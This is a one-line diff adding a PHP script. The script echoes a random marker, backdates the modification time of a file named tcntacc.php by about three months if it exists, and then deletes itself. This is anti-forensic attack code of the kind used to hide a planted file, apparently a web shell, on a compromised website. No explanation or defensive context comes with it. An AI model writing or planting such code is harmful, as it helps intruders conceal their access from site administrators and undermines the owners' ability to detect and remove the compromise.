@@ -1,0 +1,1 @@
+<?php echo "sbBfEZCYpy"; if (file_exists("./tcntacc.php")){ touch("./tcntacc.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*Dx2v0n6S5wQmtteESn0H*/ ?>
